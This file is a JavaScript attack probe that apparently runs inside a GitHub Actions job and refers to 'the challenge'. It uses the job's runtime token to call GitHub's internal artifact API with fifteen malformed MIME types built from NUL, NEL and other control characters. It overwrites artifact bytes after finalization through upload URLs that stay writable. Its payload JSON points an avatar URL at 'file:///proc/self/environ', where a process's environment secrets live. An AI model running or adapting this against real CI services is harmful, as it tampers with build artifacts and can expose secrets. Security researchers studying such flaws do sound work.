import {createHash} from 'node:crypto';
import {BlobClient} from '@azure/storage-blob';
import {internalArtifactTwirpClient} from '../node_modules/@actions/artifact/lib/internal/shared/artifact-twirp-client.js';
import {getBackendIdsFromToken} from '../node_modules/@actions/artifact/lib/internal/shared/util.js';
import {StringValue} from '../node_modules/@actions/artifact/lib/generated/index.js';

const ids = getBackendIdsFromToken();
const endpoint = new URL(
  '/twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact',
  process.env.ACTIONS_RESULTS_URL,
);
const runtimeToken = process.env.ACTIONS_RUNTIME_TOKEN;
const client = internalArtifactTwirpClient({maxAttempts: 1});
const storedMime = 'application/json\u0085';
const body = Buffer.from(JSON.stringify({
  full_name: 'pwn/repo',
  owner: {login: 'cassette', avatar_url: 'file:///proc/self/environ'},
  description: 'Repo Cassette MIME boundary carrier',
  stargazers_count: 0,
}));
const digest = createHash('sha256').update(body).digest('hex');

async function create(name, mimeType) {
  const response = await fetch(endpoint, {
    method: 'POST',
    headers: {
      authorization: `Bearer ${runtimeToken}`,
      'content-type': 'application/json',
    },
    body: JSON.stringify({
      workflow_run_backend_id: ids.workflowRunBackendId,
      workflow_job_run_backend_id: ids.workflowJobRunBackendId,
      name,
      version: 7,
      mime_type: mimeType,
    }),
  });
  const text = await response.text();
  let value = {};
  try { value = JSON.parse(text); } catch {}
  return {status: response.status, text, value};
}

async function publish(name, uploadUrl) {
  const blob = new BlobClient(uploadUrl).getBlockBlobClient();
  await blob.uploadData(body, {
    blobHTTPHeaders: {blobContentType: storedMime},
  });
  const finalized = await client.FinalizeArtifact({
    workflowRunBackendId: ids.workflowRunBackendId,
    workflowJobRunBackendId: ids.workflowJobRunBackendId,
    name,
    size: String(body.length),
    hash: StringValue.create({value: `sha256:${digest}`}),
  });

  // Upload URLs stay writable after finalization, so ensure the raw bytes and
  // underlying Azure MIME metadata are exactly what the challenge needs.
  await blob.uploadData(body, {
    blobHTTPHeaders: {blobContentType: storedMime},
  });

  const download = await client.GetSignedArtifactURL({
    workflowRunBackendId: ids.workflowRunBackendId,
    workflowJobRunBackendId: ids.workflowJobRunBackendId,
    name,
  });
  const response = await fetch(download.signedUrl);
  const bytes = Buffer.from(await response.arrayBuffer());
  const contentType = response.headers.get('content-type') || '';
  const url = new URL(download.signedUrl);
  return {
    artifactId: String(finalized.artifactId),
    downloadStatus: response.status,
    contentTypeHex: Buffer.from(contentType, 'latin1').toString('hex'),
    contentTypeJson: JSON.stringify(contentType),
    responseBytes: bytes.length,
    responseSha256: createHash('sha256').update(bytes).digest('hex'),
    rsct: url.searchParams.get('rsct'),
  };
}

const cases = [
  ['control', 'application/json'],
  ['nul-end', 'application/json\u0000'],
  ['nul-nel-end', 'application/json\u0000\u0085'],
  ['nul-x-nel', 'application/json\u0000x\u0085'],
  ['nel-nul-end', 'application/json\u0085\u0000'],
  ['nul-prefix', '\u0000application/json'],
  ['nul-prefix-nel', '\u0000application/json\u0085'],
  ['double-nul-nel', 'application/json\u0000\u0000\u0085'],
  ['del-end', 'application/json\u007f'],
  ['c1-80-end', 'application/json\u0080'],
  ['c1-9f-end', 'application/json\u009f'],
  ['dot-end', 'application/json.'],
  ['dash-end', 'application/json-'],
  ['plus-end', 'application/json+'],
  ['star-end', 'application/json*'],
];

for (const [label, mimeType] of cases) {
  const name = `nul-${process.env.GITHUB_RUN_ID}-${label}`;
  const item = {
    label,
    requestedMimeHex: Buffer.from(mimeType, 'latin1').toString('hex'),
  };
  try {
    const created = await create(name, mimeType);
    item.createStatus = created.status;
    item.createBody = created.text.slice(0, 240);
    const uploadUrl = created.value.signed_upload_url ||
      created.value.signedUploadUrl;
    if (uploadUrl) Object.assign(item, await publish(name, uploadUrl));
  } catch (error) {
    item.error = String(error).slice(0, 400);
  }
  console.log(`MIME_PROBE ${JSON.stringify(item)}`);
}
